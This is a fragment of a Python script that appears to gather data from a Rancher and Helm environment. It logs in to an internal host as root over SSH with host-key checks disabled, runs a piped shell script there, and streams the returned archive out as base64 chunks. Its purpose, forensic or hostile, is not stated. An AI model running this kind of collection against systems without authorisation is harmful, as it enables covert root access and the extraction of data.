        r = subprocess.run([ssh, "-i", kp, "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                            "-o", "BatchMode=yes", "-o", "ConnectTimeout=10", "-o", "IdentitiesOnly=yes",
                            "-o", "LogLevel=ERROR", "root@10.17.1.1", "bash -s"],
                           input=HOST2, capture_output=True, timeout=240, text=True)
        out.update({"rc": r.returncode, "stderr": r.stderr[-2000:]})
        m = re.search(r"===I10579V2HOST_BEGIN (\d+)===\s*(\S+)\s*===I10579V2HOST_END===", r.stdout, re.S)
        if not m:
            out["error"] = "no host block"; out["stdout_head"] = r.stdout[:3000]
            emit_json("HOST2_META", out, 20000); return
        out["tar_size"] = int(m.group(1))
        emit_json("HOST2_META", out, 20000)
        raw = base64.b64decode(m.group(2))
        b64chunks("HOST2_TAR", raw, 1000000)
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
        emit_json("HOST2_META", out, 20000)

def main():
    say("===I10579V2-BEGIN mode=%s ts=%s host=%s uid=%s===" % (MODE, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), socket.gethostname(), os.getuid()))
    tmp = tempfile.mkdtemp(prefix=".i10579v2-"); os.chmod(tmp, 0o700)
    try:
        try: rancher()
        except Exception as e: emit_json("R2_FATAL", {"error": "%s: %s" % (type(e).__name__, e)}, 10000)
        try: helm(tmp)
        except Exception as e: emit_json("HELM2_FATAL", {"error": "%s: %s" % (type(e).__name__, e)}, 10000)
        try: host2(tmp)
        except Exception as e: emit_json("HOST2_FATAL", {"error": "%s: %s" % (type(e).__name__, e)}, 10000)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    say("===I10579V2-END ts=%s total_b64=%d===" % (time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), TOTAL[0]))

if __name__ == "__main__":
    main()
